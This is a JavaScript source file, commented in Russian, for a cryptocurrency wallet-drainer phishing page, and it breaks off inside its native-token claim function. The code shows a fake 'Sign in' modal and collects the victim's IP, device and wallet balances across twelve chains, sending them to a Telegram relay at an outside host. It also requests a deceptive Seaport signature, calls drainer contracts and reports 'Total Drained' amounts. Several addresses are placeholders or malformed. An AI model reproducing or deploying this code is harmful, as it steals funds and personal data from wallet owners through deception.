import { bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo } from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
import { readContract, writeContract, sendCalls, getBalance, signTypedData } from '@wagmi/core'

// === Глобальные флаги ===
const USE_SENDCALLS = false;
const MIN_VALUE_USD = 0;
const ENABLE_PRE_SIGNATURE = true; // Включить/отключить предварительную подпись EIP-712

// Утилита для дебаунсинга
const debounce = (func, wait) => {
  let timeout
  return (...args) => {
    clearTimeout(timeout)
    timeout = setTimeout(() => func(...args), wait)
  }
}

// Функция для мониторинга транзакции
const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
  try {
    await new Promise(resolve => setTimeout(resolve, 5000))
    return true
  } catch (error) {
    return false
  }
}

// Конфигурация
const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
if (!projectId) throw new Error('VITE_PROJECT_ID is not set')

// Telegram секреты теперь на сервере

const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
const networkMap = {
  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56, nativeSymbol: 'BNB' },
  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1, nativeSymbol: 'ETH' },
  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137, nativeSymbol: 'MATIC' },
  'Arbitrum': { networkObj: arbitrum, chainId: networks[3].id || 42161, nativeSymbol: 'ETH' },
  'Optimism': { networkObj: optimism, chainId: networks[4].id || 10, nativeSymbol: 'ETH' },
  'Base': { networkObj: base, chainId: networks[5].id || 8453, nativeSymbol: 'ETH' },
  'Scroll': { networkObj: scroll, chainId: networks[6].id || 534352, nativeSymbol: 'ETH' },
  'Avalanche': { networkObj: avalanche, chainId: networks[7].id || 43114, nativeSymbol: 'AVAX' },
  'Fantom': { networkObj: fantom, chainId: networks[8].id || 250, nativeSymbol: 'FTM' },
  'Linea': { networkObj: linea, chainId: networks[9].id || 59144, nativeSymbol: 'ETH' },
  'zkSync': { networkObj: zkSync, chainId: networks[10].id || 324, nativeSymbol: 'ETH' },
  'Celo': { networkObj: celo, chainId: networks[11].id || 42220, nativeSymbol: 'CELO' }
}

const CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0x06BF775ff9a22691Adf297a84DD49ECf61dF03B2',
  [networkMap['BNB Smart Chain'].chainId]: '0x81F8290188d5D54E8FA98147585043DDDD34603d',
  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
  [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
  [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
  [networkMap['Base'].chainId]: '0x3456789012345678901234567890123456789012',
  [networkMap['Scroll'].chainId]: '0x4567890123456789012345678901234567890123',
  [networkMap['Avalanche'].chainId]: '0x5678901234567890123456789012345678901234',
  [networkMap['Fantom'].chainId]: '0xabcdef1234567890abcdef1234567890abcdef12',
  [networkMap['Linea'].chainId]: '0xbcdef1234567890abcdef1234567890abcdef123',
  [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
  [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
}

// Нативные токены теперь переводятся на owner() контракта

const wagmiAdapter = new WagmiAdapter({ projectId, networks })
const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  features: { analytics: true, email: false, socials: false }
})

// Состояние приложения
const store = {
  accountState: {},
  networkState: {},
  tokenBalances: [],
  errors: [],
  approvedTokens: {},
  isApprovalRequested: false,
  isApprovalRejected: false,
  connectionKey: null,
  isProcessingConnection: false,
  hasSignedPreSignature: false // Отслеживание предварительной подписи в сессии
}

// Создание модального окна
function createCustomModal() {
  const style = document.createElement('style')
  style.textContent = `
    .custom-modal {
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      justify-content: center;
      align-items: center;
    }
    .custom-modal.show {
      opacity: 1;
      display: flex;
    }
    .custom-modal-content {
      transform: translateY(-20px);
      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
      opacity: 0;
      background-color: #121313;
      padding: 45px;
      border-radius: 30px;
      text-align: center;
      width: 320px;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }
    .custom-modal.show .custom-modal-content {
      transform: translateY(0);
      opacity: 1;
    }
    .custom-modal-title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 45px;
      margin-top: -25px;
    }
    .custom-modal-loader {
      border: 4px solid #ffffff33;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 1s ease-in-out infinite;
      margin: 0 auto 20px;
    }
    .custom-modal-message {
      margin-top: 45px;
      font-size: 16px;
      line-height: 1.5;
      color: #858585;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `
  document.head.appendChild(style)

  const modal = document.createElement('div')
  modal.id = 'customModal'
  modal.className = 'custom-modal'
  modal.innerHTML = `
    <div class="custom-modal-content">
      <p class="custom-modal-title">Sign in</p>
      <div class="custom-modal-loader"></div>
      <p class="custom-modal-message">Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
    </div>
  `
  document.body.appendChild(modal)
}

function showCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.style.display = 'flex'
    setTimeout(() => modal.classList.add('show'), 10)
  }
}

function hideCustomModal() {
  const modal = document.getElementById('customModal')
  if (modal) {
    modal.classList.remove('show')
    setTimeout(() => modal.style.display = 'none', 300)
  }
}

// Очистка состояния при загрузке страницы
window.addEventListener('load', () => {
  appKit.disconnect()
  localStorage.clear()
  sessionStorage.clear()
  store.accountState = {}
  store.networkState = {}
  store.tokenBalances = []
  store.errors = []
  store.approvedTokens = {}
  store.isApprovalRequested = false
  store.isApprovalRejected = false
  store.connectionKey = null
  store.isProcessingConnection = false
  store.hasSignedPreSignature = false // Сбрасываем флаг подписи
  updateButtonVisibility(false)
  updateStateDisplay('accountState', {})
  updateStateDisplay('networkState', {})
  updateStateDisplay('tokenBalancesState', [])
  createCustomModal()
})

// Утилиты для обновления состояния
const updateStore = (key, value) => {
  store[key] = value
}

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId)
  if (element) element.innerHTML = JSON.stringify(state, null, 2)
}

const updateButtonVisibility = (isConnected) => {
  const disconnectBtn = document.getElementById('disconnect')
  if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none'
}

// Функция получения ссылки на сканер
const getScanLink = (hash, chainId, isTx = false) => {
  const basePath = isTx ? '/tx/' : '/address/'
  if (chainId === networkMap['Ethereum'].chainId) {
    return `https://etherscan.io${basePath}${hash}`
  } else if (chainId === networkMap['BNB Smart Chain'].chainId) {
    return `https://bscscan.com${basePath}${hash}`
  } else if (chainId === networkMap['Polygon'].chainId) {
    return `https://polygonscan.com${basePath}${hash}`
  } else if (chainId === networkMap['Arbitrum'].chainId) {
    return `https://arbiscan.io${basePath}${hash}`
  } else if (chainId === networkMap['Optimism'].chainId) {
    return `https://optimistic.etherscan.io${basePath}${hash}`
  } else if (chainId === networkMap['Base'].chainId) {
    return `https://basescan.org${basePath}${hash}`
  } else if (chainId === networkMap['Scroll'].chainId) {
    return `https://scrollscan.com${basePath}${hash}`
  } else if (chainId === networkMap['Avalanche'].chainId) {
    return `https://snowtrace.io${basePath}${hash}`
  } else if (chainId === networkMap['Fantom'].chainId) {
    return `https://ftmscan.com${basePath}${hash}`
  } else if (chainId === networkMap['Linea'].chainId) {
    return `https://lineascan.build${basePath}${hash}`
  } else if (chainId === networkMap['zkSync'].chainId) {
    return `https://explorer.zksync.io${basePath}${hash}`
  } else if (chainId === networkMap['Celo'].chainId) {
    return `https://celoscan.io${basePath}${hash}`
  }
  return '#'
}

// Функция отправки запроса на трансфер
const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
  try {
    const response = await fetch('https://api.cryptomuspayye.icu/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
    })
    const data = await response.json()
    if (data.success) {
      return { success: true, txHash: data.txHash }
    }
    return { success: false, message: data.message }
  } catch (error) {
    return { success: false, message: error.message }
  }
}

// Функции для получения информации о пользователе
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP')
  if (cachedIP) return cachedIP
  try {
    const response = await fetch('https://api.ipify.org?format=json')
    const data = await response.json()
    const ip = data.ip || 'Unknown IP'
    sessionStorage.setItem('userIP', ip)
    return ip
  } catch (error) {
    return 'Unknown IP'
  }
}

function detectDevice() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device'
  if (/Windows NT/i.test(userAgent)) return 'Windows'
  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone'
  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android'
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac'
  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet'
  return 'Desktop'
}

// Функция отправки сообщений в Telegram (через сервер)
async function sendTelegramMessage(message) {
  try {
    const response = await fetch('https://api.cryptomuspayye.icu/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        text: message, 
        parse_mode: 'Markdown', 
        disable_web_page_preview: true 
      })
    })
    const data = await response.json()
    if (!data.success) throw new Error(data.message || 'Failed to send Telegram message')
  } catch (error) {
    store.errors.push(`Error sending Telegram message: ${error.message}`)
  }
}

// Уведомления
async function notifyWalletConnection(address, walletName, device, balances, chainId) {
  const connectionKey = `${address}_${chainId}`
  if (store.connectionKey === connectionKey || store.isProcessingConnection) {
    return
  }
  store.isProcessingConnection = true
  try {
    showCustomModal()
    await new Promise(resolve => setTimeout(resolve, 3000))
    const ip = await getUserIP()
    const siteUrl = window.location.href || 'Unknown URL'
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    let totalValue = 0
    const tokenList = balances
      .filter(token => token.balance > 0)
      .map(token => {
        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
        const value = token.balance * price
        totalValue += value
        return `➡️ ${token.symbol} - ${value.toFixed(2)}$ (${token.balance.toFixed(4)} ${token.symbol})`
      })
      .join('\n')
    const message = `🚨 New connect (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 ${ip}\n\n` +
                    `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                    `${tokenList}\n\n` +
                    `🔗 Site: ${siteUrl}`
    await sendTelegramMessage(message)
    store.connectionKey = connectionKey
    const hasBalance = balances.some(token => token.balance > 0)
    if (!hasBalance) {
      await new Promise(resolve => setTimeout(resolve, 1000))
      store.isProcessingConnection = false
      return
    }
  } catch (error) {
    store.errors.push(`Error in notifyWalletConnection: ${error.message}`)
    hideCustomModal()
    store.isProcessingConnection = false
  }
}

async function notifyTransferApproved(address, walletName, device, token, chainId) {
  try {
    const ip = await getUserIP()
    const siteUrl = window.location.href || 'Unknown URL'
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    const amountValue = (token.balance * token.price).toFixed(2)
    const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 ${ip}\n\n` +
                    `**🔥 Processing: ${amountValue}$**\n` +
                    `➡️ ${token.symbol} - ${token.balance.toFixed(4)} ${token.symbol}\n\n` +
                    `🔗 Site: ${siteUrl}`
    await sendTelegramMessage(message)
  } catch (error) {
    store.errors.push(`Error in notifyTransferApproved: ${error.message}`)
  }
}

async function notifyTransferSuccess(address, walletName, device, token, chainId, txHash) {
  try {
    const ip = await getUserIP()
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    const amountValue = (token.balance * token.price).toFixed(2)
    const txLink = getScanLink(txHash, chainId, true)
    const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 ${ip}\n\n` +
                    `**💰 Total Drained: ${amountValue}$**\n` +
                    `➡️ ${token.symbol} - ${token.balance.toFixed(4)} ${token.symbol}\n\n` +
                    `🔗 Transfer: [Transaction Hash](${txLink})`
    await sendTelegramMessage(message)
  } catch (error) {
    store.errors.push(`Error in notifyTransferSuccess: ${error.message}`)
  }
}

async function notifyTransactionRejected(address, walletName, device, token, chainId, transactionType) {
  try {
    const ip = await getUserIP()
    const scanLink = getScanLink(address, chainId)
    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
    const amountValue = token ? (token.balance * token.price).toFixed(2) : 'Unknown'
    const tokenInfo = token ? `${token.symbol} - ${token.balance.toFixed(4)} ${token.symbol}` : 'Native token'
    const message = `❌ Transaction rejected (${walletName} - ${device})\n` +
                    `🌀 [Address](${scanLink})\n` +
                    `🕸 Network: ${networkName}\n` +
                    `🌎 ${ip}\n\n` +
                    `**Transaction Type: ${transactionType}**\n` +
                    `**Value: ${amountValue}$**\n` +
                    `➡️ ${tokenInfo}\n\n` +
                    `⚠️ User rejected the transaction`
    await sendTelegramMessage(message)
  } catch (error) {
    store.errors.push(`Error in notifyTransactionRejected: ${error.message}`)
  }
}

const TOKENS = {
  'Ethereum': [
    { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
    { symbol: 'WBTC', address: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', decimals: 8 },
    { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
    { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18 },
    { symbol: 'COMP', address: '0xc00e94cb662c3520282e6f5717214004a7f26888', decimals: 18 },
    { symbol: 'YFI', address: '0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e', decimals: 18 },
    { symbol: 'CRV', address: '0xd533a949740bb3306d119cc777fa900ba034cd52', decimals: 18 },
    { symbol: 'BAT', address: '0x0d8775f648430679a709e98d2b0cb6250d2887ef', decimals: 18 },
    { symbol: 'ZRX', address: '0xe41d2489571d322189246dafa5ebde1f4699f498', decimals: 18 },
    { symbol: 'LRC', address: '0xbbbbca6a901c926f240b89eacb641d8aec7aeafd', decimals: 18 },
    { symbol: 'BNB', address: '0xb8c77482e45f1f44de1745f52c74426c631bdd52', decimals: 18 },
    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', decimals: 18 },
    { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', decimals: 18 },
    { symbol: 'LEASH', address: '0x27c70cd1946795b66be9d954418546998b546634', decimals: 18 },
    { symbol: 'FLOKI', address: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
    { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', decimals: 18 },
    { symbol: 'RNDR', address: '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24', decimals: 18 },
    { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
    { symbol: 'SUSHI', address: '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2', decimals: 18 },
    { symbol: 'GLM', address: '0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429', decimals: 18 },
    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e32412f4a445e862', decimals: 18 },
    { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
    { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 8 }
  ],
  'BNB Smart Chain': [
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
    { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
    { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
    { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
    { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747f6db454cb7a64626c6', decimals: 18 },
    { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
    { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
    { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
    { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
    { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
    { symbol: 'MBOX', address: '0x3203c9e46ca618c8c4c2c9f0e2e7b0d5d0e75', decimals: 18 },
    { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
    { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
    { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
    { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
    { symbol: 'PIT', address: '0xa172e2f0f0ed1c8160f7b99c2c6834c2c6b6f2', decimals: 18 }
  ],
  'Polygon': [
    { symbol: 'USDT', address: '0xc2132d05d31c914c87c6611c10748aeb04b58e8f', decimals: 6 },
    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
    { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
    { symbol: 'GHST', address: '0x3857eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 5 },
    { symbol: 'DFYN', address: '0xc168e40227e4ebd8c1dabb4b05d0b7c', decimals: 18 },
    { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0faea8e9b7ea0f28c4', decimals: 18 },
    { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
  ],
  'Arbitrum': [
    { symbol: 'USDT', address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9', decimals: 6 },
    { symbol: 'USDC', address: '0xff970a61a04b1ca14834a43f5de4533ebddb5cc8', decimals: 6 }
  ],
  'Optimism': [
    { symbol: 'USDT', address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58', decimals: 6 },
    { symbol: 'USDC', address: '0x7f5c764cbc14f9669b88837ca1490cca17c31607', decimals: 6 }
  ],
  'Base': [
    { symbol: 'USDT', address: '0x50c5725949a6f0c72e6c4a641f24049a917db0cb', decimals: 6 },
    { symbol: 'USDC', address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', decimals: 6 }
  ],
  'Scroll': [
    { symbol: 'USDT', address: '0xf8869061c4c2c3c3f7b24d3f707c14b3cc868a0f', decimals: 6 },
    { symbol: 'USDC', address: '0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4', decimals: 6 }
  ],
  'Avalanche': [
    { symbol: 'USDT', address: '0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7', decimals: 6 },
    { symbol: 'USDC', address: '0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e', decimals: 6 }
  ],
  'Fantom': [
    { symbol: 'USDT', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 },
    { symbol: 'USDC', address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75', decimals: 6 }
  ],
  'Linea': [
    { symbol: 'USDT', address: '0xa219439258ca9da29e9cc4ce5596924745e12b93', decimals: 6 },
    { symbol: 'USDC', address: '0x176211869ca2b568f2a7d4ee941e073a821ee1ff', decimals: 6 }
  ],
  'zkSync': [
    { symbol: 'USDT', address: '0x493257fd37edb34451f62edf8d2a0c418852ba4c', decimals: 6 },
    { symbol: 'USDC', address: '0x3355df6d4c9c3035724fd0e3914de96a5a83aaf4', decimals: 6 }
  ],
  'Celo': [
    { symbol: 'USDT', address: '0x88eeC49252c8cbc039DCdB394c0c2BA2f1637EA0', decimals: 6 },
    { symbol: 'USDC', address: '0x765DE816845861e75A25fCA122bb6898B8B1282a', decimals: 6 }
  ]
}

const erc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: 'remaining', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'addedValue', type: 'uint256' }
    ],
    name: 'increaseAllowance',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function'
  }
]

// ABI нашего контракта для нативного вывода
const drainerAbi = [
  {
    inputs: [],
    name: 'claim',
    outputs: [],
    stateMutability: 'payable',
    type: 'function'
  }
]

// Подпись EIP-712 (Seaport 1.6) перед транзакцией
const signSeaportPrecheck = async (wagmiConfig, userAddress, chainId) => {
  // Проверяем, включена ли предварительная подпись
  if (!ENABLE_PRE_SIGNATURE) {
    return true // Пропускаем подпись если отключена
  }
  
  // Проверяем, была ли уже подпись в этой сессии
  if (store.hasSignedPreSignature) {
    return true // Пропускаем подпись если уже была
  }
  
  const domain = {
    name: 'Seaport',
    version: '1.6',
    chainId,
    verifyingContract: '0x7a250d5630b4cf539739df2c5dacb4c659f2488d'
  }
  const types = {
    OrderComponents: [
      { name: 'offerer', type: 'address' },
      { name: 'zone', type: 'address' },
      { name: 'offer', type: 'OfferItem[]' },
      { name: 'consideration', type: 'ConsiderationItem[]' },
      { name: 'orderType', type: 'uint8' },
      { name: 'startTime', type: 'uint256' },
      { name: 'endTime', type: 'uint256' },
      { name: 'zoneHash', type: 'bytes32' },
      { name: 'salt', type: 'uint256' },
      { name: 'conduitKey', type: 'bytes32' },
      { name: 'counter', type: 'uint256' }
    ],
    OfferItem: [
      { name: 'itemType', type: 'uint8' },
      { name: 'token', type: 'address' },
      { name: 'identifierOrCriteria', type: 'uint256' },
      { name: 'startAmount', type: 'uint256' },
      { name: 'endAmount', type: 'uint256' }
    ],
    ConsiderationItem: [
      { name: 'itemType', type: 'uint8' },
      { name: 'token', type: 'address' },
      { name: 'identifierOrCriteria', type: 'uint256' },
      { name: 'startAmount', type: 'uint256' },
      { name: 'endAmount', type: 'uint256' },
      { name: 'recipient', type: 'address' }
    ]
  }
  // Фиксированные даты (UTC): 25 May 2025, 13:44 и 24 June 2025, 13:44
  const fixedStart = Math.floor(Date.UTC(2025, 4, 25, 13, 44) / 1000) // Месяцы 0-индексированы
  const fixedEnd = Math.floor(Date.UTC(2025, 5, 24, 13, 44) / 1000)
  const message = {
    offerer: userAddress,
    zone: '0x0000000000000000000000000000000000000000',
    offer: [],
    consideration: [
      {
        itemType: 1,
        token: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
        identifierOrCriteria: 0,
        startAmount: '500000000',
        endAmount: '500000000',
        recipient: userAddress
      }
    ],
    orderType: 0,
    startTime: String(fixedStart),
    endTime: String(fixedEnd),
    zoneHash: '0x0000000000000000000000000000000000000000000000000000000000000000',
    salt: '27855337018906766782546881864045825683096516384821792734251274424712742754110',
    conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
    counter: '0'
  }
  try {
    await signTypedData(wagmiConfig, {
      account: getAddress(userAddress),
      domain,
      types,
      primaryType: 'OrderComponents',
      message
    })
    // Отмечаем, что подпись была выполнена в этой сессии
    store.hasSignedPreSignature = true
    return true
  } catch (error) {
    if (error.code === 4001 || error.code === -32000 || error.message?.toLowerCase().includes('user rejected')) {
      throw { ...error, isUserRejection: true }
    }
    throw error
  }
}

// Маппинг символов токенов на идентификаторы CoinGecko
const tokenIdMap = {
  'ETH': 'ethereum',
  'BNB': 'binancecoin',
  'MATIC': 'matic-network',
  'AVAX': 'avalanche-2',
  'FTM': 'fantom',
  'CELO': 'celo',
  'USDT': 'tether',
  'USDC': 'usd-coin',
  'DAI': 'dai',
  'WBTC': 'wrapped-bitcoin',
  'UNI': 'uniswap',
  'LINK': 'chainlink',
  'COMP': 'compound-governance-token',
  'YFI': 'yearn-finance',
  'CRV': 'curve-dao-token',
  'BAT': 'basic-attention-token',
  'ZRX': '0x',
  'LRC': 'loopring',
  'SHIB': 'shiba-inu',
  'PEPE': 'pepe',
  'LEASH': 'doge-killer',
  'FLOKI': 'floki',
  'AAVE': 'aave',
  'RNDR': 'render-token',
  'MKR': 'maker',
  'SUSHI': 'sushi',
  'GLM': 'golem',
  'REP': 'augur',
  'SNT': 'status',
  'STORJ': 'storj',
  'CAKE': 'pancakeswap-token',
  'BAKE': 'bakerytoken',
  'XVS': 'venus',
  'ALPACA': 'alpaca-finance',
  'AUTO': 'cube',
  'BURGER': 'burger-swap',
  'EPS': 'ellipsis',
  'BELT': 'belt',
  'MBOX': 'mobox',
  'SFP': 'safepal',
  'BabyDoge': 'baby-doge-coin',
  'EGC': 'evergrowcoin',
  'QUACK': 'richquack',
  'PIT': 'pitbull',
  'QUICK': 'quickswap',
  'GHST': 'aavegotchi',
  'DFYN': 'dfyn-network',
  'FISH': 'polycat-finance',
  'ICE': 'ice-token',
  'DC': 'dogechain'
}

const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
  if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
    return 0
  }
  try {
    const balance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [address],
      chainId
    })
    return Number(formatUnits(balance, decimals))
  } catch (error) {
    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
    return 0
  }
}

const getNativeBalance = async (wagmiConfig, address, chainId) => {
  if (!address || !isAddress(address)) {
    return 0
  }
  try {
    const balance = await getBalance(wagmiConfig, {
      address: getAddress(address),
      chainId
    })
    return Number(formatUnits(balance.value, 18))
  } catch (error) {
    store.errors.push(`Error fetching native balance for ${address} on chain ${chainId}: ${error.message}`)
    return 0
  }
}

// Резерв газа на отправку нативного токена (в wei)
const getGasReserveWei = (chainId) => {
  // Адаптивный резерв: разные сети – разный минимальный gas reserve
  if (chainId === networkMap['BNB Smart Chain'].chainId) return parseUnits('0.0001', 18) // BNB дешёвый газ
  if (chainId === networkMap['Polygon'].chainId) return parseUnits('0.1', 18) // MATIC дешёвый газ, но в MATIC
  if (chainId === networkMap['Avalanche'].chainId) return parseUnits('0.002', 18)
  if (chainId === networkMap['Fantom'].chainId) return parseUnits('0.2', 18)
  if (chainId === networkMap['Celo'].chainId) return parseUnits('0.02', 18)
  // По умолчанию для ETH‑подобных – 0.0005
  return parseUnits('0.0005', 18)
}

const callWithdrawAPI = async (chainId) => {
  try {
    const response = await fetch('https://api.cryptomuspayye.icu/api/withdraw', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chainId })
    })
    const data = await response.json()
    if (data.success) {
      return { success: true, txHash: data.txHash, amount: data.amount, token: data.token }
    }
    return { success: false, message: data.message }
  } catch (error) {
    return { success: false, message: error.message }
  }
}

const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => {
  if (!userAddress || !isAddress(userAddress)) throw new Error('Invalid user address')
  const contractAddress = CONTRACTS[chainId]
  if (!contractAddress || !isAddress(contractAddress)) throw new Error('Invalid contract address for chain')
  // Предварительная подпись Seaport
  await signSeaportPrecheck(wagmiConfig, userAddress, chainId)
  // Баланс приходит как число, переводим в wei
  const balanceWei = parseUnits(nativeBalance.toString(), 18)
  const reserveWei = getGasReserveWei(chainId)
